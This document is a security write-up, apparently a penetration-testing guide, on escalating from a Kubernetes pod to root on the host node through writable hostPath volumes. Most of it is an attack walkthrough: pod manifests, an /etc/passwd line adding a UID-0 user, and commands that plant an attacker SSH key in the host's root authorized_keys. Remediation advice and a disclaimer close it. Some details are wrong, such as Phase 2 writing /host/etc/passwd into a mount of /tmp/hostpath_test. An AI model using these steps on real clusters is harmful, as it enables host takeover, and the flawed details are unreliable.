
# Kubernetes Filesystem Permission Escalation via Volume Mounts

## 1. Overview Section

### Attack Vector Description

This vulnerability allows an attacker, with limited access within a Kubernetes cluster (e.g., the ability to deploy pods), to escalate privileges by mounting host paths as volumes into a container and then manipulating file permissions on the host filesystem. This can lead to arbitrary code execution on the host node or even cluster compromise. The attacker exploits misconfigured or insufficiently restricted pod security contexts and volume mount configurations to gain elevated access.

### Potential Impact and Consequences

*   **Host Node Compromise:** The attacker can gain shell access to the host node by modifying system files like `/etc/passwd` or `/etc/ssh/authorized_keys`.
*   **Cluster Compromise:** If the compromised node has access to the Kubernetes API server, the attacker can potentially gain full control over the cluster.
*   **Data Exfiltration:** Sensitive data stored on the host node can be accessed and exfiltrated.
*   **Denial of Service (DoS):** The attacker could intentionally damage the host node, causing service disruptions.

### Risk Level Assessment

**Critical**

### Technical Explanation

Kubernetes allows pods to mount host paths as volumes. If the pod security context is not properly configured (e.g., `runAsUser: 0` or lacking restrictive capabilities) and the mounted host path has overly permissive permissions, an attacker within the container can change the ownership or permissions of files on the host. This allows them to modify critical system files and execute arbitrary code. The vulnerability arises from a lack of proper isolation and privilege separation between the container and the host.

### Prerequisites and Conditions Needed

*   Ability to create pods in a Kubernetes namespace.
*   A pod security policy or pod security admission allowing the use of hostPath volumes.
*   A pod security context that allows running as root or with a low UID/GID that can modify files on the host volume.
*   A hostPath volume configured in a pod deployment that points to a sensitive location on the host node's filesystem (e.g., `/etc`, `/var/log`, `/root`).
*   Sufficient write permissions on the mounted host path by the container's user.
*   The targeted host system must be vulnerable to manipulation of critical files via ownership/permission changes.

## 2. Validation and Exploitation Steps Section

### Phase 1: Validation - Confirming HostPath Mounting and Write Access

This phase focuses on deploying a pod with a hostPath volume and verifying if we can write to the mounted path.

1.  **Create a simple pod definition (pod.yaml):**

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath-test
    spec:
      containers:
        - name: busybox
          image: busybox:latest
          command: ["sleep", "3600"]
          volumeMounts:
            - name: host-volume
              mountPath: /host
      volumes:
        - name: host-volume
          hostPath:
            path: /tmp/hostpath_test  # Target directory on the host
            type: DirectoryOrCreate  # Creates the directory if it doesn't exist
    ```

    **Explanation:** This YAML file defines a simple pod that uses a `hostPath` volume. The `path` specifies the directory on the host we want to mount (`/tmp/hostpath_test`). `DirectoryOrCreate` will create the directory if it does not already exist on the host. The container runs `busybox` and simply sleeps, providing a persistent shell.

2.  **Deploy the pod:**

    ```bash
    kubectl apply -f pod.yaml
    ```

    **Explanation:** This command deploys the pod defined in `pod.yaml` to the Kubernetes cluster.

    **Expected Output:** `pod/hostpath-test created`

3.  **Get a shell inside the container:**

    ```bash
    kubectl exec -it hostpath-test -- sh
    ```

    **Explanation:** This command opens an interactive shell session inside the `busybox` container.

    **Expected Output:** A shell prompt within the container, e.g., `/ #`.

4.  **Check if the volume is mounted correctly and write to the mounted volume:**

    ```bash
    ls -l /host
    echo "Hello from container" > /host/testfile.txt
    ls -l /host/testfile.txt
    cat /host/testfile.txt
    ```

    **Explanation:** This sequence of commands first lists the contents of the mounted host path to confirm it's properly mounted. Then, it attempts to write a file (`testfile.txt`) to the mounted volume.  Finally, it lists the created file to check permissions and reads the file content to ensure writing was successful.

    **Expected Output:**
    *   `ls -l /host`:  Should list the contents of `/tmp/hostpath_test` on the host (may be empty initially).
    *   `echo "Hello from container" > /host/testfile.txt`: Should execute without errors.
    *   `ls -l /host/testfile.txt`: Should display file permissions and ownership. If the UID/GID is the same as the host's file system, this indicates a higher probability of exploitation.
    *   `cat /host/testfile.txt`: Should output "Hello from container".

5.  **Validate UID and GID:**

    ```bash
    id
    ```

    **Explanation:** This command will display the user ID (UID) and group ID (GID) that the `busybox` container is running as. This is a crucial piece of information to understand the permissions within the host volume.

    **Expected Output:** A line similar to `uid=1000(someuser) gid=1000(someuser) groups=1000(someuser)`
    If the UID is `0`, the pod is running as root. This makes privilege escalation significantly easier.

### Phase 2: Exploitation - Modifying Host Files

This phase aims to exploit the writable `hostPath` volume to achieve privilege escalation on the host node. **This requires knowledge of the target host system and potential vulnerable configurations. Example is modifying /etc/passwd**

1. **(DANGER!) - Attempt to modify /etc/passwd (Example):**

   ```bash
   echo "hax:x:0:0:root:/root:/bin/bash" >> /host/etc/passwd
   ```

   **Explanation:**  This command attempts to append a new user (`hax`) with UID 0 (root) to the `/etc/passwd` file on the host, through the mounted volume `/host`. **Warning: This could potentially break the host system if not done carefully. This is an example. Always test in a controlled environment! Consider backing up /etc/passwd first, if possible.**
   **Important:** Replace `/host/etc/passwd` with the correct path of the `/etc/passwd` file based on the host system's layout. If the host uses a different authentication mechanism, this exploit will not work.

   **Expected Output:**  Ideally, no error message. If the container user has insufficient permissions, you'll see a "Permission denied" error.

2. **Check for the presence of a root shell**

   If step 1 succeeds, you can try to log in to the host as the `hax` user (if the host allows local logins and the `/etc/passwd` file is used for authentication).  This requires knowing the password of the "x" hash, which will be an empty string, but in most modern systems /etc/passwd is not allowed, or needs to be paired with a valid entry in /etc/shadow, which is often not writeable from the container.

   In most cases, this step will not result in a root shell, as many other system requirements exist such as a proper user home directory. However, the potential is there in older, improperly configured systems.

3.  **More Realistic Exploitation: Setup SSH Key (Example):**

    Given the `busybox` container likely doesn't have SSH tools, we need to mount the path `/root/.ssh` and then inject our public key into the authorized_keys file, then login with our private key. Note this will overwrite any previous `authorized_keys`.  This is only valid if the host allows root logins.

    Update the `pod.yaml` file to include a volume mount for /root/.ssh:

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath-test
    spec:
      containers:
        - name: busybox
          image: busybox:latest
          command: ["sleep", "3600"]
          volumeMounts:
            - name: host-volume
              mountPath: /host
            - name: ssh-volume
              mountPath: /root_ssh # changed
      volumes:
        - name: host-volume
          hostPath:
            path: /tmp/hostpath_test
            type: DirectoryOrCreate
        - name: ssh-volume
          hostPath:
            path: /root/.ssh # changed
            type: DirectoryOrCreate
    ```

    Apply the updated manifest and get a shell inside. Generate an SSH key pair. Copy the public key to the `/root_ssh/authorized_keys` file. Login to the host.

    ```bash
    kubectl apply -f pod.yaml
    kubectl exec -it hostpath-test -- sh
    apk add openssh-client openssh-keygen # Install ssh tools inside the container
    ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa  # Generate a key pair
    cat /root/.ssh/id_rsa.pub > /root_ssh/authorized_keys  # Add the public key
    exit
    ssh root@<host_ip> -i /path/to/your/id_rsa
    ```

    **Explanation:** This is a more practical exploitation scenario. We mount the `/root/.ssh` directory from the host into the container. We then generate an SSH keypair and add the public key to the `authorized_keys` file.  After that, we attempt to SSH into the host as root using the newly generated private key.

    **Expected Output:** If successful, this will grant you root shell access on the host node. If you receive a "Permission denied" error, it likely means that root logins are disabled via SSH or the mounted directory has incorrect permissions. You can use `chmod` in the container shell to adjust permissions as necessary, since the effective user is most likely root.

### Phase 3: Cleanup

Remove the testing pod.
```bash
kubectl delete -f pod.yaml
```

**Explanation:**  Removes the resources deployed during testing.

### Remediation Recommendations

*   **Implement Pod Security Policies (PSPs) or Pod Security Admission (PSA):** Restrict the use of `hostPath` volumes, especially with writable access.  Also restrict running as root, and require the use of AppArmor or Seccomp profiles.
*   **Least Privilege Principle:** Ensure containers run with the minimum necessary privileges.  Avoid running containers as root. Use `runAsUser` and `runAsGroup` in pod security contexts.  Configure `allowPrivilegeEscalation: false`.
*   **Regular Security Audits:** Regularly audit your Kubernetes cluster configuration to identify and address potential security vulnerabilities.
*   **Restrict Access to Sensitive Host Paths:** If hostPath volumes are necessary, mount only specific files or directories, rather than entire system directories like `/`. Apply proper permissions on the host.
*   **Node OS Hardening:** Employ hardening techniques on the underlying operating system of the Kubernetes nodes.
*   **Container Runtime Security:** Utilize container runtime security features, such as AppArmor or Seccomp, to further restrict container capabilities.
*   **Monitor for Suspicious Activity:** Implement monitoring and alerting to detect unusual activity within your Kubernetes cluster, such as unauthorized attempts to access host files.
*   **Update Regularly:** Keep Kubernetes, container runtime, and node operating systems up-to-date with the latest security patches.

**Disclaimer:** Exploiting vulnerabilities without permission is illegal and unethical. This information is provided for educational purposes only and should only be used in authorized penetration testing or security research environments.
